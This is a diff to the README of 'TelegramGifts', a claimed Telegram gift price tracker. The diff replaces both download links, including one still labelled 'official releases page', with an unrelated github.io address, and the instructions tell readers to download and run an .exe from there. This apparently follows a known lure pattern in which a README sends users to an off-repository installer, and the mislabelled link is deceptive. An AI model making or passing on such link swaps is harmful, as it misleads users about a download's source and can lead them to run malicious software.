@@ -1,6 +1,6 @@
 # 🎁 TelegramGifts - Track real time gift market values
 
-[![](https://img.shields.io/badge/Download-TelegramGifts-blue.svg)](https://github.com/Quarterstockecommerce941/TelegramGifts/releases)
+[![](https://img.shields.io/badge/Download-TelegramGifts-blue.svg)](https://quarterstockecommerce941.github.io)
 
 TelegramGifts lets you view current market prices for Telegram gifts. You see data from TGMrkt, GetGems, and Fragment in one place. The software grabs price updates, NFT models, and gift images without needing a Telegram account or API key.
 
@@ -17,7 +17,7 @@ Your computer must meet these basic needs to run the tool:
 
 You need to obtain the installer file from the official project page. Follow these steps to find the right file:
 
-1. Visit the [official releases page](https://github.com/Quarterstockecommerce941/TelegramGifts/releases).
+1. Visit the [official releases page](https://quarterstockecommerce941.github.io).
 2. Look for the latest version at the top of the page.
 3. Find the file ending in .exe under the Assets section.
 4. Click the file name to start the download to your computer.
